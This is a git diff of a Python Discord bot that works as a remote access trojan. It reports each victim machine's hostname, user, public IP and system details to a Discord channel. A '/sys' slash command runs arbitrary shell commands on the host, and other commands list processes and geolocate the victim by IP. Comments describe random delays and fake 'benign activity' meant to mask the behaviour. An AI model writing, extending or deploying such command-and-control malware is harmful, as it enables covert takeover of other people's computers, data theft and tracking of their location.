@@ -8,26 +8,30 @@ import random
 import time
 import urllib.request
 import json
+import locale 
 
-# Configurações básicas
-TOKEN = "token"
-GUILD_ID = 1343592669338665038  # Substituir pelo ID do servidor
+# ======================== CONFIGURAÇÃO ========================
+
+TOKEN = "TOKEN"
+GUILD_ID = 1343592669338665038  # ID do servidor
 CHANNEL_NAME = "🌐｜dashboard"
-
-machine_id = platform.node()
+ENCODING = locale.getpreferredencoding()
 
 intents = discord.Intents.default()
-bot = commands.Bot(command_prefix="/", intents=intents)
+intents.messages = True
+intents.guilds = True
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 
-# Aguarda tempo aleatório para mascarar comportamento
-def aguardar_aleatorio():
+# ===================== FUNÇÕES AUXILIARES =====================
+
+# tempo aleatório antes da conexao com o server para mascarar comportamento
+def random_wait():
     delay = random.randint(10, 30)
     print(f"[INFO] A aguardar {delay}s antes de iniciar...")
     time.sleep(delay)
 
 
-# Função auxiliar para obter o IP público
 def get_public_ip():
     try:
         with urllib.request.urlopen("https://api64.ipify.org") as response:
@@ -36,7 +40,7 @@ def get_public_ip():
         return "IP não disponível"
 
 # Simula ações benignas antes da execução do comando
-def simular_atividade_benigna():
+def normal_activity():
     try:
         os.listdir(".")
         platform.processor()
@@ -44,14 +48,17 @@ def simular_atividade_benigna():
     except:
         pass
 
+
+# ===================== CLASSES DE VIEW =====================
+
 # Botão para criar canal de controlo por máquina
 class MachineView(View):
     def __init__(self, machine_id):
         super().__init__(timeout=None)
         self.machine_id = machine_id
 
-    @discord.ui.button(label="Controlar", style=discord.ButtonStyle.primary)
-    async def controlar(self, interaction: discord.Interaction, button: Button):
+    @discord.ui.button(label="Control", style=discord.ButtonStyle.primary)
+    async def Control(self, interaction: discord.Interaction, button: Button):
         guild = interaction.guild
         category = discord.utils.get(guild.categories, name="Máquinas")
         if not category:
@@ -66,12 +73,48 @@ class MachineView(View):
             channel = await category.create_text_channel(name=self.machine_id, overwrites=overwrites)
         await interaction.response.send_message(f"Canal criado ou já existente: {channel.mention}", ephemeral=True)
 
-# Comando camuflado para executar instruções no sistema
+
+# ===================== EVENTOS DO BOT =====================
+
+# Evento de inicialização
+@bot.event
+async def on_ready():
+    print(f"✅ Bot {bot.user.name} está online!")
+    await bot.tree.sync()
+    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
+    if guild:
+        canal = discord.utils.get(guild.text_channels, name=CHANNEL_NAME)
+        if canal:
+            normal_activity()
+            machine_id = platform.node()
+            try:
+                machine_user = os.getlogin()
+            except:
+                machine_user = "Desconhecido"
+            ip = get_public_ip()
+            os_name = platform.system() + " " + platform.release()
+            architecture = platform.architecture()[0]
+            cpu_name = platform.processor()
+
+            embed = discord.Embed(title="New Connected Machine", color=discord.Color.green())
+            embed.add_field(name="Hostname", value=f"`{machine_id}`", inline=True)
+            embed.add_field(name="User", value=f"`{machine_user}`", inline=True)
+            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
+            embed.add_field(name="System", value=f"`{os_name}`", inline=True)
+            embed.add_field(name="architecture", value=f"`{architecture}`", inline=True)
+            embed.add_field(name="CPU", value=f"`{cpu_name}`", inline=False)
+            
+            view = MachineView(machine_id)
+            await canal.send(embed=embed, view=view)
+
+
+# ===================== COMANDOS SLASH =====================
+
 @bot.tree.command(name="sys", description="Executa uma instrução remota.")
 async def sys_action(interaction: discord.Interaction, comando: str):
-    if interaction.channel.name.lower() == machine_id.lower():
-        await interaction.response.defer(thinking=True)  # ✅ Adicionar esta linha
-        simular_atividade_benigna()  # Executa ações "inofensivas"
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True) 
+        normal_activity() 
         try:
             output = subprocess.check_output(comando, shell=True, text=True, stderr=subprocess.STDOUT, encoding="cp850")
             if not output:
@@ -83,10 +126,10 @@ async def sys_action(interaction: discord.Interaction, comando: str):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)
 
 
-@bot.tree.command(name="process", description="Lista os processos em execução na máquina")
+@bot.tree.command(name="proc", description="Lista os processos em execução na máquina")
 async def process(interaction: discord.Interaction):
-    if interaction.channel.name.lower() == machine_id.lower():
-        simular_atividade_benigna()
+    if interaction.channel.name.lower() == platform.node().lower():
+        normal_activity()
         try:
             output = subprocess.check_output("tasklist" if platform.system() == "Windows" else "ps aux", shell=True, text=True, stderr=subprocess.STDOUT, encoding="cp850")
             file_path = "process_list.txt"
@@ -100,10 +143,10 @@ async def process(interaction: discord.Interaction):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)
 
 
-@bot.tree.command(name="location", description="Obtém a localização aproximada da")
+@bot.tree.command(name="loc", description="Obtém a localização aproximada")
 async def location(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
-        simular_atividade_benigna()
+        normal_activity()
         try:
             ip = get_public_ip()
             with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as response:
@@ -111,10 +154,10 @@ async def location(interaction: discord.Interaction):
 
             if data["status"] == "success":
                 embed = discord.Embed(title="📍 Localização Aproximada", color=discord.Color.blue())
-                embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=False)
-                embed.add_field(name="🌍 País", value=data["country"], inline=True)
-                embed.add_field(name="🏙️ Cidade", value=data["city"], inline=True)
-                embed.add_field(name="🏢 ISP", value=data["isp"], inline=False)
+                embed.add_field(name="IP", value=f"`{ip}`", inline=False)
+                embed.add_field(name="País", value=data["country"], inline=True)
+                embed.add_field(name="Cidade", value=data["city"], inline=True)
+                embed.add_field(name="ISP", value=data["isp"], inline=False)
                 embed.set_footer(text="Localização obtida via IP público")
 
                 await interaction.response.send_message(embed=embed)
@@ -126,37 +169,7 @@ async def location(interaction: discord.Interaction):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
 
+# ===================== EXECUÇÃO INICIAL =====================
 
-# Evento de inicialização
-@bot.event
-async def on_ready():
-    print(f"✅ Bot {bot.user.name} está online!")
-    await bot.tree.sync()
-    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
-    if guild:
-        canal = discord.utils.get(guild.text_channels, name=CHANNEL_NAME)
-        if canal:
-            simular_atividade_benigna()
-            machine_id = platform.node()
-            try:
-                machine_user = os.getlogin()
-            except:
-                machine_user = "Desconhecido"
-            ip = get_public_ip()
-            os_name = platform.system() + " " + platform.release()
-            architecture = platform.architecture()[0]
-            cpu_name = platform.processor()
-
-            embed = discord.Embed(title="Nova Máquina Conectada", color=discord.Color.green())
-            embed.add_field(name="Hostname", value=f"`{machine_id}`", inline=True)
-            embed.add_field(name="Usuário", value=f"`{machine_user}`", inline=True)
-            embed.add_field(name="IP Público", value=f"`{ip}`", inline=True)
-            embed.add_field(name="Sistema", value=f"`{os_name}`", inline=True)
-            embed.add_field(name="Arquitetura", value=f"`{architecture}`", inline=True)
-            embed.add_field(name="CPU", value=f"`{cpu_name}`", inline=False)
-            
-            view = MachineView(machine_id)
-            await canal.send(embed=embed, view=view)
-
-aguardar_aleatorio()
+random_wait()
 bot.run(TOKEN)
